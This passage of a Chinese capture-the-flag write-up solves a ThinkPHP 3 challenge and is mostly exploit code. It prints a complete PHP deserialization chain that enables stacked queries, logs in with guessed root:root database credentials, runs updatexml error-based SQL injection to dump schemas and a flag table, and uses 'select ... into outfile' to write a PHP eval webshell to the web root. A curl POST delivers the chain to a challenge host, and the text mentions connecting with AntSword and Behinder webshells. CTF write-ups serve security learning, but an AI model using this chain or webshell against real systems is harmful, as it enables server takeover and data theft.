&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">())),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;Postman-Token: 348e180e-5893-4ab4-b1d4-f570d69f228e&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;cache-control: no-cache&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;cURL Error #:&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$response&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219200242251.png" alt="image-20211219200242251">&lt;/p>
&lt;p>看到了mysql用户，尝试弱口令得到root: root&lt;/p>
&lt;p>之后就可以把我们的伪服务端撤了，换成真服务端的，进行一个注入&lt;/p>
&lt;ul>
&lt;li>使用目标的数据库配置再次进行反序列化&lt;/li>
&lt;li>触发&lt;code>DELETE&lt;/code>语句的SQL注入&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(table_name),31) from information_schema.tables where table_schema=&amp;#39;test&amp;#39;),0x7e),1)#&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(column_name),31) from information_schema.columns where table_schema=&amp;#39;test&amp;#39;),0x7e),1)#&amp;#34;,
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(flag),31) from test.flag),0x7e),1)#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们还可以把堆叠打开，用堆叠注入写shell，也就是本题的exp（参考&lt;a href="https://www.zhaoj.in/read-6859.html#WEB3_easytp">赵总的exp&lt;/a> 赵总牛逼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_LOCAL_INFILE&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// 开启才能读取文件
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_MULTI_STATEMENTS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// 打开堆叠注入
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;debug&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;database&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;hostname&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;127.0.0.1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;hostport&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;3306&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;charset&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;utf8&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// 猜出弱口令
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver\Memcache&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Imagick&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$img&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver\Mysql&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$pk&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;where&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75715e">// 堆叠注入写入shell
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=1;select &amp;#39;&amp;lt;?php eval(&lt;/span>&lt;span style="color:#8045ff">\$&lt;/span>&lt;span style="color:#d88200">_POST[amiz]);?&amp;gt;&amp;#39; into outfile &amp;#39;/var/www/html/amiz.php&amp;#39;;#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_URL&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://914146f1-7d08-4a0a-9659-c143df1d68e1.node4.buuoj.cn:81/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_ENCODING&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_MAXREDIRS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_HTTP_VERSION&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">CURL_HTTP_VERSION_1_1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">())),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;cache-control: no-cache&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;cURL Error #:&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$response&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中curl的代码是用postman生成的 &lt;del>（postman打钱）&lt;/del> 一套连招直接带走，用蚁剑连接之后发现根目录下没有flag，反而是一个flag.sh&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219194548981.png" alt="image-20211219194548981">&lt;/p>
&lt;p>我们还得连上数据库看看&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219195443288.png" alt="image-20211219195443288">&lt;/p>
&lt;p>但是蚁剑自带的添加失败，直接手动写一个冰蝎的🐎&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219195808735.png" alt="image-20211219195808735">&lt;/p>
&lt;p>直接查看也是没有，但是可以用它的导出数据库的功能得到数据&lt;/p>
